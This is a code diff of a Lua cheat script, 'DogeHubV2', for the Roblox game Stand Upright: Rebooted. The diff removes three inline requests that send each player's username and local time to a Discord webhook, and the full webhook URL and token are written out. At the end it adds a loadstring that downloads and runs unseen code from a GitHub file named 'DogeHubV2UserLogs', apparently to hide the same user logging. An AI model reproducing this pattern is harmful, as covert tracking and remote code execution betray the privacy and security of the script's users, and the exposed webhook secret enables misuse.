@@ -5201,13 +5201,7 @@ local function StandUprightRebootedMain()
 		notify("Discord link copied to clipboard!")
 	end)
 
-    request({ 
-        Url = "https://discord.com/api/webhooks/1408138525576269926/98mkVdFouhI-xg-MEZHafiaaUjvDjQSyhmlMZw3KzvJ6lgz_rWruqfOti6QaKVZvUeyE", 
-        Method = "POST", Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "",["embeds"] = {{["type"] = "rich",["title"] = game:GetService("Players").LocalPlayer.Name,["color"] = 11730954,["fields"] = {{["name"] = "Local Time: ",["value"] = os.date(),["inline"] = true}},
-                ["description"] = "Executed DogeHubV2 in \n Stand Upright: Rebooted",
-            }}      
-        })
-    })
+    gameplaceexecuted = "Stand Upright: Rebooted"
 
 end
 
@@ -5364,13 +5358,7 @@ local function StandUprightRebooted1v1MatchmakingLobby()
 	TextButton.MouseButton1Click:connect(DELUI)
 	TextButtonText.MouseButton1Click:connect(DELUI)
 
-    request({ 
-        Url = "https://discord.com/api/webhooks/1408138525576269926/98mkVdFouhI-xg-MEZHafiaaUjvDjQSyhmlMZw3KzvJ6lgz_rWruqfOti6QaKVZvUeyE", 
-        Method = "POST", Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "",["embeds"] = {{["type"] = "rich",["title"] = game:GetService("Players").LocalPlayer.Name,["color"] = 11730954,["fields"] = {{["name"] = "Local Time: ",["value"] = os.date(),["inline"] = true}},
-                ["description"] = "Executed DogeHubV2 in \n Stand Upright: Rebooted",
-            }}      
-        })
-    })
+	gameplaceexecuted = "Stand Upright: Rebooted"
 
 end
 
@@ -5994,13 +5982,7 @@ local function StandUprightRebootedGangWarQueueingLobby()
 		notify("Discord link copied to clipboard!")
 	end)
 
-    request({ 
-        Url = "https://discord.com/api/webhooks/1408138525576269926/98mkVdFouhI-xg-MEZHafiaaUjvDjQSyhmlMZw3KzvJ6lgz_rWruqfOti6QaKVZvUeyE", 
-        Method = "POST", Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "",["embeds"] = {{["type"] = "rich",["title"] = game:GetService("Players").LocalPlayer.Name,["color"] = 11730954,["fields"] = {{["name"] = "Local Time: ",["value"] = os.date(),["inline"] = true}},
-                ["description"] = "Executed DogeHubV2 in \n Stand Upright: Rebooted",
-            }}      
-        })
-    })
+	gameplaceexecuted = "Stand Upright: Rebooted"
 
 end
 
@@ -6013,3 +5995,4 @@ elseif game.PlaceId == 12725290692 then
 else
 	StandUprightRebootedMain()
 end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Kasep6720/Secret/refs/heads/Functions/DogeHubV2UserLogs', true))()
